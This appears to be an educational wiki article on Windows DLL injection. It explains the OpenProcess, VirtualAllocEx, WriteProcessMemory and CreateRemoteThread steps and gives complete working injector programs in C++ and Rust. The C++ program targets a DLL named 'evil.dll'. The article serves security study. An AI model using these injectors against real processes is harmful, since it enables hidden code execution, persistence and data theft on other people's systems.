
DLL injection is a technique used in software programming where a malicious code is injected into a legitimate process. 

This is done by forcing the process to load and execute a dynamic-link library (DLL) that contains the malicious code. Once the malicious DLL is loaded, it can perform various unauthorized actions, such as stealing sensitive information, modifying system behavior, or providing remote access to the compromised system. 

Due to the nature of DLLs, this attack can only be performed on windows systems, but other similar techniques exist for other systems, such as Shared Object Injection for Unix-like systems, Mach-O Injection for MacOS and bytecode Injection into Dalvik/ART for systems based on Android. 
## How does it work ?

First, we need a handle to the target process, so we need to open the target process using the **OpenProcess** function.
We then need to allocate space in memory for our  DLL Path. This can be easily achieved using the **VirtualAllocEx** function, then written into using the **WriteProcessMemory** function.

After this, using **GetProcAddress**, we recover the address of the **LoadLibrary** function in kernel32.dll.  
  
The final step is to create a thread in the target process. Using the lpStartAddress parameter we can specify a "Start routine", a function that will tell the program a new thread is being started. 
Using **LoadLibrary** as a start routine, it will be executed when the thread starts attaching our DLL to the targeted process.
## Examples
### In C++
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evilDLL[] = "C:\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  LPVOID rb; // remote buffer

  // handle to kernel32 and pass it to GetProcAddress
  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  // parse process ID
  if ( atoi(argv[1]) == 0) {
      printf("PID not found :( exiting...\n");
      return -1;
  }
  printf("PID: %i", atoi(argv[1]));
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "copy" evil DLL between processes
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
  CloseHandle(ph);
  return 0;
}
```

### In Rust 
```rust
use std::{env, process};  
use windows::{  
    core::s,  
    Win32::{  
        Foundation::*,  
        System::{  
            Threading::{OpenProcess, PROCESS_ALL_ACCESS, CreateRemoteThread, INFINITE, WaitForSingleObject},  
            Memory::{VirtualAllocEx, PAGE_READWRITE, MEM_RESERVE, MEM_COMMIT},  
            LibraryLoader::{GetProcAddress,GetModuleHandleA},  
            Diagnostics::Debug::WriteProcessMemory,  
        },  
    }  
};  
  
  
fn main() {  
    let args: Vec<String> = env::args().collect();  
    if args.len() != 2 {  
        eprintln!("Usage: {} <pid>", args[0]);  
        process::exit(1);  
    }  
    let pid = match (&args[1]).parse::<u32>() {  
        Ok(pid) => {  
            println!("[+] PID: {}", &pid);  
            pid  
        },  
        Err(err) => {  
            eprintln!("[-] Error parsing PID: {}", err);  
            process::exit(1);  
        }  
    };  
  
    let dll_path = "C:\\Users\\Amber\\RustroverProjects\\Rust-Dll\\target\\release\\hello.dll";  
  
    unsafe {  
        println!("[+] Opening target process");  
        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid).unwrap_or_else(|e| {  
            eprintln!("[-] Failed to open target process, PID might be invalid");  
            process::exit(-1);  
        });  
  
  
        let haddr = VirtualAllocEx(hprocess, None, dll_path.len(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);  
        if haddr.is_null() {  
            eprintln!("[-] Failed to allocate remote memory");  
            process::exit(-1);  
        }  
  
        println!("[+] Writing DLL path into remote memory");  
        WriteProcessMemory(hprocess, haddr, dll_path.as_ptr() as _, dll_path.len(), None)  
            .unwrap_or_else(|_err| {  
                eprintln!("[-] Failed to write DLL Path to remote memory");  
                process::exit(-1);  
            });  
  
        let hkernel32 = GetModuleHandleA(s!("kernel32.dll")).unwrap_or_else(|e| {  
            eprintln!("[-] Failed to get a handle on kernel32.dll");  
            std::process::exit(-1);  
        });  
        let loadlib = GetProcAddress(hkernel32, s!("LoadLibraryA"));  
  
        println!("[+] Creating remote thread");  
        let hthread = CreateRemoteThread(  
            hprocess,  
            None,  
            0,  
            Some(std::mem::transmute(loadlib)),  
            Some(haddr),  
            0,  
            Some(std::ptr::null_mut()  
        )).unwrap_or_else(|_err| {  
            eprintln!("[-] Failed to create remote thread");  
            process::exit(-1);  
        });  
        WaitForSingleObject(hthread, INFINITE);  
        CloseHandle(hprocess).unwrap_or_else(|e| {  
            eprintln!("[-] Failed to close process handle");  
            process::exit(-1);  
        });  
    }  
  
    println!("[+] Done !");  
}
```

## References

### MSDN 
[OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
[VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
[GetModuleHandleA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)
[GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
[WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
[CreateRemoteThreadEx](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex)
[CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)
